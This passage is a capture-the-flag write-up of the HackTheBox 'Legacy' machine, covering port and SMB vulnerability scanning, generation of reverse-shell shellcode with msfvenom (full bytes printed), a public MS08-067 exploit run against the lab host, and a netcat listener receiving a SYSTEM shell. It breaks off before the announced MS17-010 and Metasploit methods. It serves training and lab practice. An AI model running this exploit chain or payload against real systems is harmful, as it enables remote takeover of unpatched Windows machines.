I"‚½<blockquote>
  <p>Legacy from HackTheBox is an retired machine which is vulnerable to infamous MS08-067 &amp; MS17-010 SMB vulnerabilities which can be easily exploited with publicly available scripts and Metasploit.</p>
</blockquote>

<blockquote>
  <p>We will use three different methods to pwn the box. First, we will use MS08-067 exploit, then MS17-010 exploit and last we will use Metasploit for automatic exploitation.</p>
</blockquote>

<h2 id="reconnaissance">Reconnaissance</h2>

<p>Lets start out with <code class="language-plaintext highlighter-rouge">masscan</code> and <code class="language-plaintext highlighter-rouge">Nmap</code> to find out open ports and services:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb
â†’ masscan <span class="nt">-e</span> tun0 <span class="nt">-p0-65535</span> <span class="nt">--max-rate</span> 500 10.10.10.4

Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-09-01 11:05:17 GMT
 <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
Initiating SYN Stealth Scan
Scanning 1 hosts <span class="o">[</span>65536 ports/host]
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 445/tcp on 10.10.10.4

cfx:  ~/Documents/htb
â†’ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 139,445 10.10.10.4
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-09-01 16:49 IST
Nmap scan report <span class="k">for </span>10.10.10.4
Host is up <span class="o">(</span>0.21s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP<span class="p">;</span> CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: <span class="nt">-4h28m48s</span>, deviation: 2h07m16s, median: <span class="nt">-5h58m48s</span>
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:f8:10 <span class="o">(</span>VMware<span class="o">)</span>
| smb-os-discovery:
|   OS: Windows XP <span class="o">(</span>Windows 2000 LAN Manager<span class="o">)</span>
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY<span class="se">\x</span>00
|   Workgroup: HTB<span class="se">\x</span>00
|_  System <span class="nb">time</span>: 2020-09-01T11:20:40+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
|_smb2-time: Protocol negotiation failed <span class="o">(</span>SMB2<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>59.95 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Looking at the output of <code class="language-plaintext highlighter-rouge">masscan</code>&amp; <code class="language-plaintext highlighter-rouge">nmap</code> we discovered SMB ports <code class="language-plaintext highlighter-rouge">139 &amp; 445</code> are open and operating system running on the host is <code class="language-plaintext highlighter-rouge">Windows XP</code>.</p>

<h3 id="nmap-smb-script">Nmap SMB script</h3>

<p>Since <code class="language-plaintext highlighter-rouge">SMB</code> has been exploited widely in the past, letâ€™s run <code class="language-plaintext highlighter-rouge">nmap</code> script to check for SMB vulnerabilities.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb
â†’ nmap <span class="nt">--script</span> smb-vuln<span class="k">*</span> <span class="nt">-p</span> 139,445 10.10.10.4
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-09-01 16:51 IST
Nmap scan report <span class="k">for </span>10.10.10.4
Host is up <span class="o">(</span>0.21s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution <span class="o">(</span>MS08-067<span class="o">)</span>
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service <span class="k">in </span>Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure <span class="nb">date</span>: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2008-4250
|_smb-vuln-ms10-054: <span class="nb">false</span>
|_smb-vuln-ms10-061: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability <span class="k">in </span>Microsoft SMBv1 servers <span class="o">(</span>ms17-010<span class="o">)</span>
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk <span class="nb">factor</span>: HIGH
|       A critical remote code execution vulnerability exists <span class="k">in </span>Microsoft SMBv1
|        servers <span class="o">(</span>ms17-010<span class="o">)</span><span class="nb">.</span>
|
|     Disclosure <span class="nb">date</span>: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>9.47 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We discovered the host is vulnerable to notorious SMB exploits <code class="language-plaintext highlighter-rouge">MS08-67 (exploited widely by Conficker worm)</code> and <code class="language-plaintext highlighter-rouge">MS17-010 (by Shadow Brokers)</code>.</p>

<p>Letâ€™s exploit both vulnerabilities <strong>MS08-67</strong> &amp; <strong>MS17-010</strong> manually sticking to OSCP pattern using publicly available exploit scripts.</p>

<h2 id="ms08-67">MS08-67</h2>

<p>There are multiple MS08-67 exploits available on the internet but the one which worked the best for me is from <strong>Jivoi</strong> available <a href="https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py"><strong>here</strong></a></p>

<p>To make this python script work we just have to replace the default given <code class="language-plaintext highlighter-rouge">shellcode</code> with our own. Shellcode generation command via <code class="language-plaintext highlighter-rouge">msfvenom</code> for different payload style is already given in comments by the author inside the script.</p>

<h3 id="generating-shellcode">Generating Shellcode</h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb
â†’ msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.14 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-b</span> <span class="s2">"x00</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">40"</span> <span class="nt">-f</span> c <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows                                
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character <span class="o">(</span><span class="nv">index</span><span class="o">=</span>55, <span class="nv">char</span><span class="o">=</span>0x78<span class="o">)</span>
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>0<span class="o">)</span>
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1488 bytes
unsigned char buf[] <span class="o">=</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">29</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">0e"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">8f</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">ee</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">29</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">8f</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">c1"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">7c</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">dd</span><span class="se">\x</span><span class="s2">ff"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">a7</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">a9</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">8a</span><span class="se">\x</span><span class="s2">bd</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">a3"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">cb</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">82</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">ae</span><span class="se">\x</span><span class="s2">7d</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">dd</span><span class="se">\x</span><span class="s2">fb</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">06"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">15</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">12"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">22</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">3d</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">2a"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">fa</span><span class="se">\x</span><span class="s2">1d</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">fa"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">d7</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">9f</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">dd</span><span class="se">\x</span><span class="s2">4d"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">3b</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">ab</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">9a</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">ee</span><span class="se">\x</span><span class="s2">b2</span><span class="se">\x</span><span class="s2">9b"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">1d</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">9e</span><span class="se">\x</span><span class="s2">13</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">d3</span><span class="se">\x</span><span class="s2">a7</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">a9</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">bd</span><span class="se">\x</span><span class="s2">eb"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">98</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">13</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">3b</span><span class="se">\x</span><span class="s2">a9</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">37"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">7b</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">8f</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">18</span><span class="se">\x</span><span class="s2">df</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">cc</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">99"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">df</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">1c</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">1c</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">14</span><span class="se">\x</span><span class="s2">14"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">ee</span><span class="se">\x</span><span class="s2">a9</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">85</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">0d"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">ab</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">a9</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">2a</span><span class="se">\x</span><span class="s2">9f</span><span class="se">\x</span><span class="s2">a0</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">83"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">14</span><span class="se">\x</span><span class="s2">8f</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">fa</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">a9</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">a2</span><span class="se">\x</span><span class="s2">21"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">7d</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">d3</span><span class="se">\x</span><span class="s2">15</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">3c"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">2a</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">ab</span><span class="se">\x</span><span class="s2">fb</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">cb</span><span class="se">\x</span><span class="s2">bf"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">bd</span><span class="se">\x</span><span class="s2">87</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">bd</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">b0"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">6d</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">8f</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">14</span><span class="se">\x</span><span class="s2">f1</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">87</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">dc</span><span class="se">\x</span><span class="s2">2c"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">92</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">cb</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">29</span><span class="se">\x</span><span class="s2">7e</span><span class="se">\x</span><span class="s2">7c</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">fd"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">b7</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">9e</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">eb"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">92</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">5a"</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We will replace the default shellcode given in the script with above one generated.</p>

<p>Looking at the usage of this exploit on line 228, we can see the exploit requires us to know the OS version and Language pack:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="gp">      print '\nUsage: %s &lt;target ip&gt;</span><span class="w"> </span>&lt;os <span class="c">#&gt; &lt;Port #&gt;\n' % sys.argv[0]</span>
<span class="go">      print 'Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445'
      print 'Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)'
      print 'Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal'
      print 'Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English'
      print 'Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)'
      print 'Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)'
      print 'Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)'
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p>Based on our Nmap results we know the host is running Windows XP and taking a wild guess we can try the exploit with option 6 for <code class="language-plaintext highlighter-rouge">Windows XP SP3 English (NX)</code></p>

<h3 id="exploitation">Exploitation</h3>

<p>Lets start the <code class="language-plaintext highlighter-rouge">nc</code> listener on port 443 and execute the exploit:</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre><span class="go">cfx:  ~/Documents/htb/legacy
â†’ /usr/bin/python2 /root/Documents/htb/legacy/ms08-067.py 10.10.10.4 6 445
</span><span class="gp">#</span><span class="c">######################################################################</span>
<span class="gp">#</span><span class="w">   </span>MS08-067 Exploit
<span class="gp">#</span><span class="w">   </span>This is a modified verion of Debasis Mohanty<span class="s1">'s code (https://www.exploit-db.com/exploits/7132/).
</span><span class="gp">#</span><span class="w">   </span><span class="s1">The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
</span><span class="gp">#</span><span class="w">
</span><span class="gp">#</span><span class="w">   </span><span class="s1">Mod in 2018 by Andy Acer
</span><span class="gp">#</span><span class="w">   </span><span class="s1">- Added support for selecting a target port at the command line.
</span><span class="gp">#</span><span class="w">   </span><span class="s1">- Changed library calls to allow for establishing a NetBIOS session for SMB transport
</span><span class="gp">#</span><span class="w">   </span><span class="s1">- Changed shellcode handling to allow for variable length shellcode.
</span><span class="gp">#</span><span class="s1">######################################################################
</span><span class="go">

</span><span class="gp">$</span><span class="w">   </span>This version requires the Python Impacket library version to 0_9_17 or newer.
<span class="gp">$</span><span class="w">
</span><span class="gp">$</span><span class="w">   </span>Here<span class="s1">'s how to upgrade if necessary:
</span><span class="gp">$</span><span class="w">
</span><span class="gp">$</span><span class="w">   </span><span class="s1">git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
</span><span class="gp">$</span><span class="w">   </span><span class="s1">cd impacket
</span><span class="gp">$</span><span class="w">   </span><span class="s1">pip install .
</span><span class="go">

</span><span class="gp">#</span><span class="c">######################################################################</span>
<span class="go">
Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>As the exploit finishes we get a call back on our listener:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/legacy
â†’ nc <span class="nt">-lvnp</span> 443
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1028.
Microsoft Windows XP <span class="o">[</span>Version 5.1.2600]
<span class="o">(</span>C<span class="o">)</span> Copyright 1985-2001 Microsoft Corp.

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami</span>
<span class="s1">'whoami'</span> is not recognized as an internal or external <span class="nb">command</span>,
operable program or batch file.

C:<span class="se">\D</span>ocuments and Settings<span class="se">\j</span>ohn<span class="se">\D</span>esktop&gt;type user.txt
<span class="nb">type </span>user.txt
e69af0e4f443de<span class="k">*****************</span>f

C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;type root.txt
<span class="nb">type </span>root.txt
993442d258b0e0<span class="k">*****************</span>3
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The fact that we could grab both the flag indicates that we are running as <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>, but how do we confirm whether we are running as system since Windows XP doesnâ€™t have <code class="language-plaintext highlighter-rouge">whoami</code> binary.</p>

